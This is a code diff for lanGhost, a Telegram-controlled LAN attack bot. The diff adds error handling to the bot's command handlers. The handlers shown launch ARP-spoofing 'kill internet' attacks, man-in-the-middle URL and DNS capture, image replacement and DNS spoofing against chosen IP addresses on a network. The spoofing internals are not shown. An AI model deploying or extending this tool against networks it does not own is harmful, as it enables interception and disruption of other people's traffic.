@@ -342,67 +342,83 @@ def msg_start(bot, update):
     if not str(update.message.chat_id) == str(admin_chatid):
         return
 
-    bot.send_message(chat_id=update.message.chat_id, text="Welcome to lanGhost! 👻")
+    try:
+        bot.send_message(chat_id=update.message.chat_id, text="Welcome to lanGhost! 👻")
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def msg_ping(bot, update):
     global admin_chatid
     if not str(update.message.chat_id) == str(admin_chatid):
         return
 
-    bot.send_message(chat_id=update.message.chat_id, text="Pong! ⚡️")
+    try:
+        bot.send_message(chat_id=update.message.chat_id, text="Pong! ⚡️")
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def msg_scan(bot, update, args):
     global admin_chatid
     if not str(update.message.chat_id) == str(admin_chatid):
         return
 
-    global latest_scan
-    bot.send_message(chat_id=update.message.chat_id, text="Scanning network... 🔎")
-    textline = "📱 Devices online:\n\n"
-    temp_latest_scan = latest_scan[:]
-    temp_latest_scan = sorted(temp_latest_scan, key=lambda x: x[0])
-    for host in temp_latest_scan:
-        if len(host) > 2:
-            textline += host[0] + " ➖ " + resolveMac(host[1]) + " ➖ " + host[2] + "\n"
-        else:
-            textline += host[0] + " ➖ " + resolveMac(host[1]) + "\n"
-    textline = textline[:-1]
-    bot.send_message(chat_id=update.message.chat_id, text=textline)
+    try:
+        global latest_scan
+        bot.send_message(chat_id=update.message.chat_id, text="Scanning network... 🔎")
+        textline = "📱 Devices online:\n\n"
+        temp_latest_scan = latest_scan[:]
+        temp_latest_scan = sorted(temp_latest_scan, key=lambda x: x[0])
+        for host in temp_latest_scan:
+            if len(host) > 2:
+                textline += host[0] + " ➖ " + resolveMac(host[1]) + " ➖ " + host[2] + "\n"
+            else:
+                textline += host[0] + " ➖ " + resolveMac(host[1]) + "\n"
+        textline = textline[:-1]
+        bot.send_message(chat_id=update.message.chat_id, text=textline)
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def msg_kill(bot, update, args):
     global admin_chatid
     if not str(update.message.chat_id) == str(admin_chatid):
         return
 
-    if args == []:
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /kill [TARGET-IP]")
-        return
+    try:
+        if args == []:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Usage: /kill [TARGET-IP]")
+            return
 
-    target_ip = args[0]
+        target_ip = args[0]
 
-    global latest_scan
-    hosts = latest_scan[:]
-    target_mac = False
-    for host in hosts:
-        if host[0] == target_ip:
-            target_mac = host[1]
-    if not target_mac:
-        bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
-        return
+        global latest_scan
+        hosts = latest_scan[:]
+        target_mac = False
+        for host in hosts:
+            if host[0] == target_ip:
+                target_mac = host[1]
+        if not target_mac:
+            bot.send_message(chat_id=update.message.chat_id, text="⚠️ Target host is not up.")
+            return
 
-    target = [target_ip, target_mac]
-    iptables("kill", target=target[0])
-    if not attackManager("isattacked", target=target_ip):
-        ID = attackManager("new", attack_type="kill", target=target_ip)
-        kill_thread = threading.Thread(target=arpSpoof, args=[target])
-        kill_thread.daemon = True
-        kill_thread.start()
-    else:
-        ID = attackManager("new", attack_type="kill", target=target_ip)
+        target = [target_ip, target_mac]
+        iptables("kill", target=target[0])
+        if not attackManager("isattacked", target=target_ip):
+            ID = attackManager("new", attack_type="kill", target=target_ip)
+            kill_thread = threading.Thread(target=arpSpoof, args=[target])
+            kill_thread.daemon = True
+            kill_thread.start()
+        else:
+            ID = attackManager("new", attack_type="kill", target=target_ip)
 
-    bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
-    bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
-    bot.send_message(chat_id=update.message.chat_id, text="🔥 Killing internet for " + target_ip + "...")
+        bot.send_message(chat_id=update.message.chat_id, text="Starting attack with ID: " + str(ID))
+        bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
+        bot.send_message(chat_id=update.message.chat_id, text="🔥 Killing internet for " + target_ip + "...")
+    except:
+        print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def msg_stop(bot, update, args):
     global admin_chatid
@@ -469,6 +485,7 @@ def msg_stop(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="✅ Attack " + str(ID) + " stopped...")
     except:
         print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def msg_attacks(bot, update, args):
     global admin_chatid
@@ -488,6 +505,7 @@ def msg_attacks(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="🔥 Attacks running:\n\n" + textline)
     except:
         print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def msg_mitm(bot, update, args):
     global admin_chatid
@@ -529,6 +547,7 @@ def msg_mitm(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="🔥 Capturing URL's and DNS from " + target_ip + "...")
     except:
         print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 
 def msg_img(bot, update):
@@ -581,6 +600,7 @@ def msg_img(bot, update):
                     break
     except:
         print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def msg_replaceimg(bot, update, args):
     global admin_chatid
@@ -621,6 +641,7 @@ def msg_replaceimg(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="📷 Please send the image you want to replace others with:")
     except:
         print("[!!!] " + str(traceback.format_exc()))
+        bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 
 def msg_spoofdns(bot, update, args):
@@ -673,6 +694,7 @@ def msg_spoofdns(bot, update, args):
         bot.send_message(chat_id=update.message.chat_id, text="Type /stop " + str(ID) + " to stop the attack.")
         bot.send_message(chat_id=update.message.chat_id, text="🔥 Spoofing DNS for " + target[0] + "...")
     except:
+        print("[!!!] " + str(traceback.format_exc()))
         bot.send_message(chat_id=update.message.chat_id, text="❌ Whooops, something went wrong... Please try again.")
 
 def main():
